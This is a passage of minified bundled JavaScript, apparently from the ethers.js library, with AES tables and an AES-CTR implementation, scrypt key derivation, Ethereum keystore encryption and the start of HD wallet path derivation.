          , Fk = [0, 185469197, 370938394, 487725847, 741876788, 657861945, 975451694, 824852259, 1483753576, 1400783205, 1315723890, 1164071807, 1950903388, 2135319889, 1649704518, 1767536459, 2967507152, 3152976349, 2801566410, 2918353863, 2631447780, 2547432937, 2328143614, 2177544179, 3901806776, 3818836405, 4270639778, 4118987695, 3299409036, 3483825537, 3535072918, 3652904859, 2077965243, 1893020342, 1841768865, 1724457132, 1474502543, 1559041666, 1107234197, 1257309336, 598438867, 681933534, 901210569, 1052338372, 261314535, 77422314, 428819965, 310463728, 3409685355, 3224740454, 3710368113, 3593056380, 3875770207, 3960309330, 4045380933, 4195456072, 2471224067, 2554718734, 2237133081, 2388260884, 3212035895, 3028143674, 2842678573, 2724322336, 4138563181, 4255350624, 3769721975, 3955191162, 3667219033, 3516619604, 3431546947, 3347532110, 2933734917, 2782082824, 3099667487, 3016697106, 2196052529, 2313884476, 2499348523, 2683765030, 1179510461, 1296297904, 1347548327, 1533017514, 1786102409, 1635502980, 2087309459, 2003294622, 507358933, 355706840, 136428751, 53458370, 839224033, 957055980, 605657339, 790073846, 2373340630, 2256028891, 2607439820, 2422494913, 2706270690, 2856345839, 3075636216, 3160175349, 3573941694, 3725069491, 3273267108, 3356761769, 4181598602, 4063242375, 4011996048, 3828103837, 1033297158, 915985419, 730517276, 545572369, 296679730, 446754879, 129166120, 213705253, 1709610350, 1860738147, 1945798516, 2029293177, 1239331162, 1120974935, 1606591296, 1422699085, 4148292826, 4233094615, 3781033664, 3931371469, 3682191598, 3497509347, 3446004468, 3328955385, 2939266226, 2755636671, 3106780840, 2988687269, 2198438022, 2282195339, 2501218972, 2652609425, 1201765386, 1286567175, 1371368976, 1521706781, 1805211710, 1620529459, 2105887268, 1988838185, 533804130, 350174575, 164439672, 46346101, 870912086, 954669403, 636813900, 788204353, 2358957921, 2274680428, 2592523643, 2441661558, 2695033685, 2880240216, 3065962831, 3182487618, 3572145929, 3756299780, 3270937875, 3388507166, 4174560061, 4091327024, 4006521127, 3854606378, 1014646705, 930369212, 711349675, 560487590, 272786309, 457992840, 106852767, 223377554, 1678381017, 1862534868, 1914052035, 2031621326, 1211247597, 1128014560, 1580087799, 1428173050, 32283319, 182621114, 401639597, 486441376, 768917123, 651868046, 1003007129, 818324884, 1503449823, 1385356242, 1333838021, 1150208456, 1973745387, 2125135846, 1673061617, 1756818940, 2970356327, 3120694122, 2802849917, 2887651696, 2637442643, 2520393566, 2334669897, 2149987652, 3917234703, 3799141122, 4284502037, 4100872472, 3309594171, 3460984630, 3545789473, 3629546796, 2050466060, 1899603969, 1814803222, 1730525723, 1443857720, 1560382517, 1075025698, 1260232239, 575138148, 692707433, 878443390, 1062597235, 243256656, 91341917, 409198410, 325965383, 3403100636, 3252238545, 3704300486, 3620022987, 3874428392, 3990953189, 4042459122, 4227665663, 2460449204, 2578018489, 2226875310, 2411029155, 3198115200, 3046200461, 2827177882, 2743944855]
          , Uk = [0, 218828297, 437656594, 387781147, 875313188, 958871085, 775562294, 590424639, 1750626376, 1699970625, 1917742170, 2135253587, 1551124588, 1367295589, 1180849278, 1265195639, 3501252752, 3720081049, 3399941250, 3350065803, 3835484340, 3919042237, 4270507174, 4085369519, 3102249176, 3051593425, 2734591178, 2952102595, 2361698556, 2177869557, 2530391278, 2614737639, 3145456443, 3060847922, 2708326185, 2892417312, 2404901663, 2187128086, 2504130317, 2555048196, 3542330227, 3727205754, 3375740769, 3292445032, 3876557655, 3926170974, 4246310725, 4027744588, 1808481195, 1723872674, 1910319033, 2094410160, 1608975247, 1391201670, 1173430173, 1224348052, 59984867, 244860394, 428169201, 344873464, 935293895, 984907214, 766078933, 547512796, 1844882806, 1627235199, 2011214180, 2062270317, 1507497298, 1423022939, 1137477952, 1321699145, 95345982, 145085239, 532201772, 313773861, 830661914, 1015671571, 731183368, 648017665, 3175501286, 2957853679, 2807058932, 2858115069, 2305455554, 2220981195, 2474404304, 2658625497, 3575528878, 3625268135, 3473416636, 3254988725, 3778151818, 3963161475, 4213447064, 4130281361, 3599595085, 3683022916, 3432737375, 3247465558, 3802222185, 4020912224, 4172763771, 4122762354, 3201631749, 3017672716, 2764249623, 2848461854, 2331590177, 2280796200, 2431590963, 2648976442, 104699613, 188127444, 472615631, 287343814, 840019705, 1058709744, 671593195, 621591778, 1852171925, 1668212892, 1953757831, 2037970062, 1514790577, 1463996600, 1080017571, 1297403050, 3673637356, 3623636965, 3235995134, 3454686199, 4007360968, 3822090177, 4107101658, 4190530515, 2997825956, 3215212461, 2830708150, 2779915199, 2256734592, 2340947849, 2627016082, 2443058075, 172466556, 122466165, 273792366, 492483431, 1047239e3, 861968209, 612205898, 695634755, 1646252340, 1863638845, 2013908262, 1963115311, 1446242576, 1530455833, 1277555970, 1093597963, 1636604631, 1820824798, 2073724613, 1989249228, 1436590835, 1487645946, 1337376481, 1119727848, 164948639, 81781910, 331544205, 516552836, 1039717051, 821288114, 669961897, 719700128, 2973530695, 3157750862, 2871682645, 2787207260, 2232435299, 2283490410, 2667994737, 2450346104, 3647212047, 3564045318, 3279033885, 3464042516, 3980931627, 3762502690, 4150144569, 4199882800, 3070356634, 3121275539, 2904027272, 2686254721, 2200818878, 2384911031, 2570832044, 2486224549, 3747192018, 3528626907, 3310321856, 3359936201, 3950355702, 3867060991, 4049844452, 4234721005, 1739656202, 1790575107, 2108100632, 1890328081, 1402811438, 1586903591, 1233856572, 1149249077, 266959938, 48394827, 369057872, 418672217, 1002783846, 919489135, 567498868, 752375421, 209336225, 24197544, 376187827, 459744698, 945164165, 895287692, 574624663, 793451934, 1679968233, 1764313568, 2117360635, 1933530610, 1343127501, 1560637892, 1243112415, 1192455638, 3704280881, 3519142200, 3336358691, 3419915562, 3907448597, 3857572124, 4075877127, 4294704398, 3029510009, 3113855344, 2927934315, 2744104290, 2159976285, 2377486676, 2594734927, 2544078150]
          , Dk = [0, 151849742, 303699484, 454499602, 607398968, 758720310, 908999204, 1059270954, 1214797936, 1097159550, 1517440620, 1400849762, 1817998408, 1699839814, 2118541908, 2001430874, 2429595872, 2581445614, 2194319100, 2345119218, 3034881240, 3186202582, 2801699524, 2951971274, 3635996816, 3518358430, 3399679628, 3283088770, 4237083816, 4118925222, 4002861748, 3885750714, 1002142683, 850817237, 698445255, 548169417, 529487843, 377642221, 227885567, 77089521, 1943217067, 2061379749, 1640576439, 1757691577, 1474760595, 1592394909, 1174215055, 1290801793, 2875968315, 2724642869, 3111247143, 2960971305, 2405426947, 2253581325, 2638606623, 2487810577, 3808662347, 3926825029, 4044981591, 4162096729, 3342319475, 3459953789, 3576539503, 3693126241, 1986918061, 2137062819, 1685577905, 1836772287, 1381620373, 1532285339, 1078185097, 1229899655, 1040559837, 923313619, 740276417, 621982671, 439452389, 322734571, 137073913, 19308535, 3871163981, 4021308739, 4104605777, 4255800159, 3263785589, 3414450555, 3499326569, 3651041127, 2933202493, 2815956275, 3167684641, 3049390895, 2330014213, 2213296395, 2566595609, 2448830231, 1305906550, 1155237496, 1607244650, 1455525988, 1776460110, 1626319424, 2079897426, 1928707164, 96392454, 213114376, 396673818, 514443284, 562755902, 679998e3, 865136418, 983426092, 3708173718, 3557504664, 3474729866, 3323011204, 4180808110, 4030667424, 3945269170, 3794078908, 2507040230, 2623762152, 2272556026, 2390325492, 2975484382, 3092726480, 2738905026, 2857194700, 3973773121, 3856137295, 4274053469, 4157467219, 3371096953, 3252932727, 3673476453, 3556361835, 2763173681, 2915017791, 3064510765, 3215307299, 2156299017, 2307622919, 2459735317, 2610011675, 2081048481, 1963412655, 1846563261, 1729977011, 1480485785, 1362321559, 1243905413, 1126790795, 878845905, 1030690015, 645401037, 796197571, 274084841, 425408743, 38544885, 188821243, 3613494426, 3731654548, 3313212038, 3430322568, 4082475170, 4200115116, 3780097726, 3896688048, 2668221674, 2516901860, 2366882550, 2216610296, 3141400786, 2989552604, 2837966542, 2687165888, 1202797690, 1320957812, 1437280870, 1554391400, 1669664834, 1787304780, 1906247262, 2022837584, 265905162, 114585348, 499347990, 349075736, 736970802, 585122620, 972512814, 821712160, 2595684844, 2478443234, 2293045232, 2174754046, 3196267988, 3079546586, 2895723464, 2777952454, 3537852828, 3687994002, 3234156416, 3385345166, 4142626212, 4293295786, 3841024952, 3992742070, 174567692, 57326082, 410887952, 292596766, 777231668, 660510266, 1011452712, 893681702, 1108339068, 1258480242, 1343618912, 1494807662, 1715193156, 1865862730, 1948373848, 2100090966, 2701949495, 2818666809, 3004591147, 3122358053, 2235061775, 2352307457, 2535604243, 2653899549, 3915653703, 3764988233, 4219352155, 4067639125, 3444575871, 3294430577, 3746175075, 3594982253, 836553431, 953270745, 600235211, 718002117, 367585007, 484830689, 133361907, 251657213, 2041877159, 1891211689, 1806599355, 1654886325, 1568718495, 1418573201, 1335535747, 1184342925];
        function Lk(e) {
            const t = [];
            for (let r = 0; r < e.length; r += 4)
                t.push(e[r] << 24 | e[r + 1] << 16 | e[r + 2] << 8 | e[r + 3]);
            return t
        }
        class jk {
            get key() {
                return Ak(this, vk, "f").slice()
            }
            constructor(e) {
                if (vk.set(this, void 0),
                wk.set(this, void 0),
                Tk.set(this, void 0),
                !(this instanceof jk))
                    throw Error("AES must be instanitated with `new`");
                Ek(this, vk, new Uint8Array(e), "f");
                const t = Pk[this.key.length];
                if (null == t)
                    throw new TypeError("invalid key size (must be 16, 24 or 32 bytes)");
                Ek(this, Tk, [], "f"),
                Ek(this, wk, [], "f");
                for (let l = 0; l <= t; l++)
                    Ak(this, Tk, "f").push([0, 0, 0, 0]),
                    Ak(this, wk, "f").push([0, 0, 0, 0]);
                const r = 4 * (t + 1)
                  , n = this.key.length / 4
                  , o = Lk(this.key);
                let i;
                for (let l = 0; l < n; l++)
                    i = l >> 2,
                    Ak(this, Tk, "f")[i][l % 4] = o[l],
                    Ak(this, wk, "f")[t - i][l % 4] = o[l];
                let s, a = 0, c = n;
                for (; c < r; ) {
                    if (s = o[n - 1],
                    o[0] ^= Sk[s >> 16 & 255] << 24 ^ Sk[s >> 8 & 255] << 16 ^ Sk[255 & s] << 8 ^ Sk[s >> 24 & 255] ^ Ck[a] << 24,
                    a += 1,
                    8 != n)
                        for (let t = 1; t < n; t++)
                            o[t] ^= o[t - 1];
                    else {
                        for (let e = 1; e < n / 2; e++)
                            o[e] ^= o[e - 1];
                        s = o[n / 2 - 1],
                        o[n / 2] ^= Sk[255 & s] ^ Sk[s >> 8 & 255] << 8 ^ Sk[s >> 16 & 255] << 16 ^ Sk[s >> 24 & 255] << 24;
                        for (let e = n / 2 + 1; e < n; e++)
                            o[e] ^= o[e - 1]
                    }
                    let e, i, l = 0;
                    for (; l < n && c < r; )
                        e = c >> 2,
                        i = c % 4,
                        Ak(this, Tk, "f")[e][i] = o[l],
                        Ak(this, wk, "f")[t - e][i] = o[l++],
                        c++
                }
                for (let l = 1; l < t; l++)
                    for (let e = 0; e < 4; e++)
                        s = Ak(this, wk, "f")[l][e],
                        Ak(this, wk, "f")[l][e] = Nk[s >> 24 & 255] ^ Fk[s >> 16 & 255] ^ Uk[s >> 8 & 255] ^ Dk[255 & s]
            }
            encrypt(e) {
                if (16 != e.length)
                    throw new TypeError("invalid plaintext size (must be 16 bytes)");
                const t = Ak(this, Tk, "f").length - 1
                  , r = [0, 0, 0, 0];
                let n = Lk(e);
                for (let s = 0; s < 4; s++)
                    n[s] ^= Ak(this, Tk, "f")[0][s];
                for (let s = 1; s < t; s++) {
                    for (let e = 0; e < 4; e++)
                        r[e] = Bk[n[e] >> 24 & 255] ^ xk[n[(e + 1) % 4] >> 16 & 255] ^ Ok[n[(e + 2) % 4] >> 8 & 255] ^ _k[255 & n[(e + 3) % 4]] ^ Ak(this, Tk, "f")[s][e];
                    n = r.slice()
                }
                const o = new Uint8Array(16);
                let i = 0;
                for (let s = 0; s < 4; s++)
                    i = Ak(this, Tk, "f")[t][s],
                    o[4 * s] = 255 & (Sk[n[s] >> 24 & 255] ^ i >> 24),
                    o[4 * s + 1] = 255 & (Sk[n[(s + 1) % 4] >> 16 & 255] ^ i >> 16),
                    o[4 * s + 2] = 255 & (Sk[n[(s + 2) % 4] >> 8 & 255] ^ i >> 8),
                    o[4 * s + 3] = 255 & (Sk[255 & n[(s + 3) % 4]] ^ i);
                return o
            }
            decrypt(e) {
                if (16 != e.length)
                    throw new TypeError("invalid ciphertext size (must be 16 bytes)");
                const t = Ak(this, wk, "f").length - 1
                  , r = [0, 0, 0, 0];
                let n = Lk(e);
                for (let s = 0; s < 4; s++)
                    n[s] ^= Ak(this, wk, "f")[0][s];
                for (let s = 1; s < t; s++) {
                    for (let e = 0; e < 4; e++)
                        r[e] = Wk[n[e] >> 24 & 255] ^ Rk[n[(e + 3) % 4] >> 16 & 255] ^ kk[n[(e + 2) % 4] >> 8 & 255] ^ Mk[255 & n[(e + 1) % 4]] ^ Ak(this, wk, "f")[s][e];
                    n = r.slice()
                }
                const o = new Uint8Array(16);
                let i = 0;
                for (let s = 0; s < 4; s++)
                    i = Ak(this, wk, "f")[t][s],
                    o[4 * s] = 255 & (Ik[n[s] >> 24 & 255] ^ i >> 24),
                    o[4 * s + 1] = 255 & (Ik[n[(s + 3) % 4] >> 16 & 255] ^ i >> 16),
                    o[4 * s + 2] = 255 & (Ik[n[(s + 2) % 4] >> 8 & 255] ^ i >> 8),
                    o[4 * s + 3] = 255 & (Ik[255 & n[(s + 1) % 4]] ^ i);
                return o
            }
        }
        vk = new WeakMap,
        wk = new WeakMap,
        Tk = new WeakMap;
        class zk {
            constructor(e, t, r) {
                if (r && !(this instanceof r))
                    throw new Error("".concat(e, ' must be instantiated with "new"'));
                Object.defineProperties(this, {
                    aes: {
                        enumerable: !0,
                        value: new jk(t)
                    },
                    name: {
                        enumerable: !0,
                        value: e
                    }
                })
            }
        }
        new WeakMap,
        new WeakMap;
        var Vk, Hk = function(e, t, r, n) {
            if ("a" === r && !n)
                throw new TypeError("Private accessor was defined without a getter");
            if ("function" === typeof t ? e !== t || !n : !t.has(e))
                throw new TypeError("Cannot read private member from an object whose class did not declare it");
            return "m" === r ? n : "a" === r ? n.call(e) : n ? n.value : t.get(e)
        };
        new WeakMap,
        Vk = new WeakMap,
        new WeakSet;
        var qk, Gk, $k, Kk = function(e, t, r, n, o) {
            if ("m" === n)
                throw new TypeError("Private method is not writable");
            if ("a" === n && !o)
                throw new TypeError("Private accessor was defined without a setter");
            if ("function" === typeof t ? e !== t || !o : !t.has(e))
                throw new TypeError("Cannot write private member to an object whose class did not declare it");
            return "a" === n ? o.call(e, r) : o ? o.value = r : t.set(e, r),
            r
        }, Zk = function(e, t, r, n) {
            if ("a" === r && !n)
                throw new TypeError("Private accessor was defined without a getter");
            if ("function" === typeof t ? e !== t || !n : !t.has(e))
                throw new TypeError("Cannot read private member from an object whose class did not declare it");
            return "m" === r ? n : "a" === r ? n.call(e) : n ? n.value : t.get(e)
        };
        class Yk extends zk {
            constructor(e, t) {
                super("CTR", e, Yk),
                qk.set(this, void 0),
                Gk.set(this, void 0),
                $k.set(this, void 0),
                Kk(this, $k, new Uint8Array(16), "f"),
                Zk(this, $k, "f").fill(0),
                Kk(this, qk, Zk(this, $k, "f"), "f"),
                Kk(this, Gk, 16, "f"),
                null == t && (t = 1),
                "number" === typeof t ? this.setCounterValue(t) : this.setCounterBytes(t)
            }
            get counter() {
                return new Uint8Array(Zk(this, $k, "f"))
            }
            setCounterValue(e) {
                if (!Number.isInteger(e) || e < 0 || e > Number.MAX_SAFE_INTEGER)
                    throw new TypeError("invalid counter initial integer value");
                for (let t = 15; t >= 0; --t)
                    Zk(this, $k, "f")[t] = e % 256,
                    e = Math.floor(e / 256)
            }
            setCounterBytes(e) {
                if (16 !== e.length)
                    throw new TypeError("invalid counter initial Uint8Array value length");
                Zk(this, $k, "f").set(e)
            }
            increment() {
                for (let e = 15; e >= 0; e--) {
                    if (255 !== Zk(this, $k, "f")[e]) {
                        Zk(this, $k, "f")[e]++;
                        break
                    }
                    Zk(this, $k, "f")[e] = 0
                }
            }
            encrypt(e) {
                var t, r;
                const n = new Uint8Array(e);
                for (let o = 0; o < n.length; o++)
                    16 === Zk(this, Gk, "f") && (Kk(this, qk, this.aes.encrypt(Zk(this, $k, "f")), "f"),
                    Kk(this, Gk, 0, "f"),
                    this.increment()),
                    n[o] ^= Zk(this, qk, "f")[(Kk(this, Gk, (r = Zk(this, Gk, "f"),
                    t = r++,
                    r), "f"),
                    t)];
                return n
            }
            decrypt(e) {
                return this.encrypt(e)
            }
        }
        qk = new WeakMap,
        Gk = new WeakMap,
        $k = new WeakMap;
        new WeakMap,
        new WeakMap,
        new WeakMap;
        const Jk = (e, t) => e << t | e >>> 32 - t;
        function Xk(e, t, r, n, o, i) {
            let s = e[t++] ^ r[n++]
              , a = e[t++] ^ r[n++]
              , c = e[t++] ^ r[n++]
              , l = e[t++] ^ r[n++]
              , u = e[t++] ^ r[n++]
              , d = e[t++] ^ r[n++]
              , h = e[t++] ^ r[n++]
              , f = e[t++] ^ r[n++]
              , p = e[t++] ^ r[n++]
              , g = e[t++] ^ r[n++]
              , y = e[t++] ^ r[n++]
              , m = e[t++] ^ r[n++]
              , b = e[t++] ^ r[n++]
              , v = e[t++] ^ r[n++]
              , w = e[t++] ^ r[n++]
              , T = e[t++] ^ r[n++]
              , A = s
              , E = a
              , P = c
              , C = l
              , S = u
              , I = d
              , B = h
              , x = f
              , O = p
              , _ = g
              , W = y
              , R = m
              , k = b
              , M = v
              , N = w
              , F = T;
            for (let U = 0; U < 8; U += 2)
                S ^= Jk(A + k | 0, 7),
                O ^= Jk(S + A | 0, 9),
                k ^= Jk(O + S | 0, 13),
                A ^= Jk(k + O | 0, 18),
                _ ^= Jk(I + E | 0, 7),
                M ^= Jk(_ + I | 0, 9),
                E ^= Jk(M + _ | 0, 13),
                I ^= Jk(E + M | 0, 18),
                N ^= Jk(W + B | 0, 7),
                P ^= Jk(N + W | 0, 9),
                B ^= Jk(P + N | 0, 13),
                W ^= Jk(B + P | 0, 18),
                C ^= Jk(F + R | 0, 7),
                x ^= Jk(C + F | 0, 9),
                R ^= Jk(x + C | 0, 13),
                F ^= Jk(R + x | 0, 18),
                E ^= Jk(A + C | 0, 7),
                P ^= Jk(E + A | 0, 9),
                C ^= Jk(P + E | 0, 13),
                A ^= Jk(C + P | 0, 18),
                B ^= Jk(I + S | 0, 7),
                x ^= Jk(B + I | 0, 9),
                S ^= Jk(x + B | 0, 13),
                I ^= Jk(S + x | 0, 18),
                R ^= Jk(W + _ | 0, 7),
                O ^= Jk(R + W | 0, 9),
                _ ^= Jk(O + R | 0, 13),
                W ^= Jk(_ + O | 0, 18),
                k ^= Jk(F + N | 0, 7),
                M ^= Jk(k + F | 0, 9),
                N ^= Jk(M + k | 0, 13),
                F ^= Jk(N + M | 0, 18);
            o[i++] = s + A | 0,
            o[i++] = a + E | 0,
            o[i++] = c + P | 0,
            o[i++] = l + C | 0,
            o[i++] = u + S | 0,
            o[i++] = d + I | 0,
            o[i++] = h + B | 0,
            o[i++] = f + x | 0,
            o[i++] = p + O | 0,
            o[i++] = g + _ | 0,
            o[i++] = y + W | 0,
            o[i++] = m + R | 0,
            o[i++] = b + k | 0,
            o[i++] = v + M | 0,
            o[i++] = w + N | 0,
            o[i++] = T + F | 0
        }
        function Qk(e, t, r, n, o) {
            let i = n + 0
              , s = n + 16 * o;
            for (let a = 0; a < 16; a++)
                r[s + a] = e[t + 16 * (2 * o - 1) + a];
            for (let a = 0; a < o; a++,
            i += 16,
            t += 16)
                Xk(r, s, e, t, r, i),
                a > 0 && (s += 16),
                Xk(r, i, e, t += 16, r, s)
        }
        function eM(e, t, r) {
            const n = jI({
                dkLen: 32,
                asyncTick: 10,
                maxmem: 1073742848
            }, r)
              , {N: o, r: i, p: s, dkLen: a, asyncTick: c, maxmem: l, onProgress: u} = n;
            if (SI(o),
            SI(i),
            SI(s),
            SI(a),
            SI(c),
            SI(l),
            void 0 !== u && "function" !== typeof u)
                throw new Error("progressCb should be function");
            const d = 128 * i
              , h = d / 4;
            if (o <= 1 || 0 !== (o & o - 1) || o >= 2 ** (d / 8) || o > 2 ** 32)
                throw new Error("Scrypt: N must be larger than 1, a power of 2, less than 2^(128 * r / 8) and less than 2^32");
            if (s < 0 || s > 137438953440 / d)
                throw new Error("Scrypt: p must be a positive integer less than or equal to ((2^32 - 1) * 32) / (128 * r)");
            if (a < 0 || a > 137438953440)
                throw new Error("Scrypt: dkLen should be positive integer less than or equal to (2^32 - 1) * 32");
            const f = d * (o + s);
            if (f > l)
                throw new Error("Scrypt: parameters too large, ".concat(f, " (128 * r * (N + p)) > ").concat(l, " (maxmem)"));
            const p = KI(rB, e, t, {
                c: 1,
                dkLen: d * s
            })
              , g = RI(p)
              , y = RI(new Uint8Array(d * o))
              , m = RI(new Uint8Array(d));
            let b = () => {}
            ;
            if (u) {
                const e = 2 * o * s
                  , t = Math.max(Math.floor(e / 1e4), 1);
                let r = 0;
                b = () => {
                    r++,
                    !u || r % t && r !== e || u(r / e)
                }
            }
            return {
                N: o,
                r: i,
                p: s,
                dkLen: a,
                blockSize32: h,
                V: y,
                B32: g,
                B: p,
                tmp: m,
                blockMixCb: b,
                asyncTick: c
            }
        }
        function tM(e, t, r, n, o) {
            const i = KI(rB, e, r, {
                c: 1,
                dkLen: t
            });
            return r.fill(0),
            n.fill(0),
            o.fill(0),
            i
        }
        let rM = !1
          , nM = !1;
        const oM = async function(e, t, r, n, o, i, s) {
            return await async function(e, t, r) {
                const {N: n, r: o, p: i, dkLen: s, blockSize32: a, V: c, B32: l, B: u, tmp: d, blockMixCb: h, asyncTick: f} = eM(e, t, r);
                for (let p = 0; p < i; p++) {
                    const e = a * p;
                    for (let r = 0; r < a; r++)
                        c[r] = l[e + r];
                    let t = 0;
                    await FI(n - 1, f, ( () => {
                        Qk(c, t, c, t += a, o),
                        h()
                    }
                    )),
                    Qk(c, (n - 1) * a, l, e, o),
                    h(),
                    await FI(n, f, ( () => {
                        const t = l[e + a - 16] % n;
                        for (let r = 0; r < a; r++)
                            d[r] = l[e + r] ^ c[t * a + r];
                        Qk(d, 0, l, e, o),
                        h()
                    }
                    ))
                }
                return tM(e, s, u, c, d)
            }(e, t, {
                N: r,
                r: n,
                p: o,
                dkLen: i,
                onProgress: s
            })
        }
          , iM = function(e, t, r, n, o, i) {
            return function(e, t, r) {
                const {N: n, r: o, p: i, dkLen: s, blockSize32: a, V: c, B32: l, B: u, tmp: d, blockMixCb: h} = eM(e, t, r);
                for (let f = 0; f < i; f++) {
                    const e = a * f;
                    for (let t = 0; t < a; t++)
                        c[t] = l[e + t];
                    for (let t = 0, r = 0; t < n - 1; t++)
                        Qk(c, r, c, r += a, o),
                        h();
                    Qk(c, (n - 1) * a, l, e, o),
                    h();
                    for (let t = 0; t < n; t++) {
                        const t = l[e + a - 16] % n;
                        for (let r = 0; r < a; r++)
                            d[r] = l[e + r] ^ c[t * a + r];
                        Qk(d, 0, l, e, o),
                        h()
                    }
                }
                return tM(e, s, u, c, d)
            }(e, t, {
                N: r,
                r: n,
                p: o,
                dkLen: i
            })
        };
        let sM = oM
          , aM = iM;
        async function cM(e, t, r, n, o, i, s) {
            const a = zS(e, "passwd")
              , c = zS(t, "salt");
            return $S(await sM(a, c, r, n, o, i, s))
        }
        function lM(e, t, r, n, o, i) {
            const s = zS(e, "passwd")
              , a = zS(t, "salt");
            return $S(aM(s, a, r, n, o, i))
        }
        function uM(e) {
            const t = zS(e, "randomBytes");
            t[6] = 15 & t[6] | 64,
            t[8] = 63 & t[8] | 128;
            const r = $S(t);
            return [r.substring(2, 10), r.substring(10, 14), r.substring(14, 18), r.substring(18, 22), r.substring(22, 34)].join("-")
        }
        function dM(e, t) {
            for (e = String(e); e.length < t; )
                e = "0" + e;
            return e
        }
        function hM(e) {
            return "string" === typeof e ? FB(e, "NFKC") : VS(e)
        }
        cM._ = oM,
        cM.lock = function() {
            nM = !0
        }
        ,
        cM.register = function(e) {
            if (nM)
                throw new Error("scrypt is locked");
            sM = e
        }
        ,
        Object.freeze(cM),
        lM._ = iM,
        lM.lock = function() {
            rM = !0
        }
        ,
        lM.register = function(e) {
            if (rM)
                throw new Error("scryptSync is locked");
            aM = e
        }
        ,
        Object.freeze(lM);
        const fM = "m/44'/60'/0'/0/0";
        function pM(e) {
            const t = null != e.salt ? zS(e.salt, "options.salt") : zW(32);
            let r = 1 << 17
              , n = 8
              , o = 1;
            return e.scrypt && (e.scrypt.N && (r = e.scrypt.N),
            e.scrypt.r && (n = e.scrypt.r),
            e.scrypt.p && (o = e.scrypt.p)),
            NS("number" === typeof r && r > 0 && Number.isSafeInteger(r) && (BigInt(r) & BigInt(r - 1)) === BigInt(0), "invalid scrypt N parameter", "options.N", r),
            NS("number" === typeof n && n > 0 && Number.isSafeInteger(n), "invalid scrypt r parameter", "options.r", n),
            NS("number" === typeof o && o > 0 && Number.isSafeInteger(o), "invalid scrypt p parameter", "options.p", o),
            {
                name: "scrypt",
                dkLen: 32,
                salt: t,
                N: r,
                r: n,
                p: o
            }
        }
        function gM(e, t, r, n) {
            const o = zS(r.privateKey, "privateKey")
              , i = null != n.iv ? zS(n.iv, "options.iv") : zW(16);
            NS(16 === i.length, "invalid options.iv length", "options.iv", n.iv);
            const s = null != n.uuid ? zS(n.uuid, "options.uuid") : zW(16);
            NS(16 === s.length, "invalid options.uuid length", "options.uuid", n.iv);
            const a = e.slice(0, 16)
              , c = e.slice(16, 32)
              , l = zS(new Yk(a,i).encrypt(o))
              , u = ix(KS([c, l]))
              , d = {
                address: r.address.substring(2).toLowerCase(),
                id: uM(s),
                version: 3,
                Crypto: {
                    cipher: "aes-128-ctr",
                    cipherparams: {
                        iv: $S(i).substring(2)
                    },
                    ciphertext: $S(l).substring(2),
                    kdf: "scrypt",
                    kdfparams: {
                        salt: $S(t.salt).substring(2),
                        n: t.N,
                        dklen: 32,
                        p: t.p,
                        r: t.r
                    },
                    mac: u.substring(2)
                }
            };
            if (r.mnemonic) {
                const t = null != n.client ? n.client : "ethers/".concat(BS)
                  , o = r.mnemonic.path || fM
                  , i = r.mnemonic.locale || "en"
                  , s = e.slice(32, 64)
                  , a = zS(r.mnemonic.entropy, "account.mnemonic.entropy")
                  , c = zW(16)
                  , l = zS(new Yk(s,c).encrypt(a))
                  , u = new Date
                  , h = "UTC--" + (u.getUTCFullYear() + "-" + dM(u.getUTCMonth() + 1, 2) + "-" + dM(u.getUTCDate(), 2) + "T" + dM(u.getUTCHours(), 2) + "-" + dM(u.getUTCMinutes(), 2) + "-" + dM(u.getUTCSeconds(), 2) + ".0Z") + "--" + d.address;
                d["x-ethers"] = {
                    client: t,
                    gethFilename: h,
                    path: o,
                    locale: i,
                    mnemonicCounter: $S(c).substring(2),
                    mnemonicCiphertext: $S(l).substring(2),
                    version: "0.1"
                }
            }
            return JSON.stringify(d)
        }
        var yM;
        const mM = "m/44'/60'/0'/0/0"
          , bM = new Uint8Array([66, 105, 116, 99, 111, 105, 110, 32, 115, 101, 101, 100])
          , vM = 2147483648
          , wM = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
        function TM(e, t) {
            let r = "";
            for (; e; )
                r = "0123456789abcdef"[e % 16] + r,
                e = Math.trunc(e / 16);
            for (; r.length < 2 * t; )
                r = "0" + r;
            return "0x" + r
        }
        function AM(e) {
            const t = zS(e);
            return function(e) {
                const t = zS(e);
                let r = aI(t)
                  , n = "";
                for (; r; )
                    n = qR[Number(r % ZR)] + n,
                    r /= ZR;
                for (let o = 0; o < t.length && !t[o]; o++)
                    n = qR[0] + n;
                return n
            }(KS([t, YS(BB(BB(t)), 0, 4)]))
        }
        const EM = {};
        function PM(e, t, r, n) {
            const o = new Uint8Array(37);
            e & vM ? (MS(null != n, "cannot derive child of neutered node", "UNSUPPORTED_OPERATION", {
                operation: "deriveChild"
            }),
            o.set(zS(n), 1)) : o.set(zS(r));
            for (let s = 24; s >= 0; s -= 8)
                o[33 + (s >> 3)] = e >> 24 - s & 255;
            const i = zS(Bx("sha512", t, o));
            return {
                IL: i.slice(0, 32),
                IR: i.slice(32)
            }
        }
        function CM(e, t) {
            const r = t.split("/");
            NS(r.length > 0, "invalid path", "path", t),
            "m" === r[0] && (NS(0 === e.depth, 'cannot derive root path (i.e. path starting with "m/") for a node at non-zero depth '.concat(e.depth), "path", t),
            r.shift());
            let n = e;
            for (let o = 0; o < r.length; o++) {
                const e = r[o];
                if (e.match(/^[0-9]+'$/)) {
                    const t = parseInt(e.substring(0, e.length - 1));
                    NS(t < vM, "invalid path index", "path[".concat(o, "]"), e),
                    n = n.deriveChild(vM + t)
                } else if (e.match(/^[0-9]+$/)) {
                    const t = parseInt(e);
                    NS(t < vM, "invalid path index", "path[".concat(o, "]"), e),
                    n = n.deriveChild(t)
                } else
                    NS(!1, "invalid path component", "path[".concat(o, "]"), e)
            }
            return n
        }
        var SM = new WeakSet;
        class IM extends bk {
            constructor(e, t, r, n, o, i, s, a, c) {
                super(t, c),
                DB(this, SM),
                (0,
                CI.A)(this, "publicKey", void 0),
                (0,
                CI.A)(this, "fingerprint", void 0),
                (0,
                CI.A)(this, "parentFingerprint", void 0),
                (0,
                CI.A)(this, "mnemonic", void 0),
                (0,
                CI.A)(this, "chainCode", void 0),
                (0,
                CI.A)(this, "path", void 0),
                (0,
                CI.A)(this, "index", void 0),
                (0,
                CI.A)(this, "depth", void 0),
                LS(e, EM, "HDNodeWallet"),
                _S(this, {
                    publicKey: t.compressedPublicKey
                });
                _S(this, {
                    parentFingerprint: r,
                    fingerprint: YS(UW(BB(this.publicKey)), 0, 4),
                    chainCode: n,
                    path: o,
                    index: i,
                    depth: s
